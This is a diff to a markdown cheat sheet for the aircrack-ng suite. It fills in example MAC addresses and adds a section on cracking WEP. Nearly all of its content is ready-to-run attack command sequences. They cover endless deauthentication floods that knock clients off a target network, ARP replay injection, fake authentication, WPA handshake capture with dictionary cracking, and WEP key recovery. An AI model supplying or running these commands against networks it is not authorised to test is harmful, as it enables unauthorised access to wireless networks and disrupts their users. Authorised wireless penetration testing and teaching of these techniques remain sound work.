@@ -2,7 +2,8 @@
 
 In this example
 - `mon0` is the name of your interface in monitor mode
-- `XX:XX:XX:XX:XX:XX` is the bssid of target network
+- `00:14:6C:7E:40:80` is the bssid of target network
+- `00:09:5B:EB:C5:2B` is the bssid of your network
 - `-c X` is the channel of target network
 - `out` is the filename to capture the WPA handshake
 - `password.txt` is the filename to brute force
@@ -37,9 +38,9 @@ aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
 ## ARP request
 
 ```
-airodump-ng -c 6 -w out --bssid 00:13:10:30:24:9C mon0
-aireplay-ng -0 10 -a 00:13:10:30:24:9C mon0
-aireplay-ng -3 -b 00:13:10:30:24:9C -h 00:09:5B:EB:C5:2B mon0
+airodump-ng -c 6 -w out --bssid 00:14:6C:7E:40:80 mon0
+aireplay-ng -0 10 -a 00:14:6C:7E:40:80 mon0
+aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
 ```
 
 ## [Cracking WPA/WPA2](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
@@ -49,6 +50,16 @@ airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w out mon0
 aireplay-ng --deauth 0 -a 00:14:6C:7E:40:80 mon0
 (wait handshake)
 aircrack-ng -w password.txt -b 00:14:6C:7E:40:80 out*.cap 
+```
+
+## Crack WEP by ARP request
+
+```
+airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w out mon0
+aireplay-ng -1 100 -a 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+aireplay-ng -3 0 -b 00:14:6C:7E:40:80 -h 00:09:5B:EB:C5:2B mon0
+(wait to capture about 70.000 packet)
+aircrack-ng -a 1 out*.cap
 ```
 
 ## Brute force tools
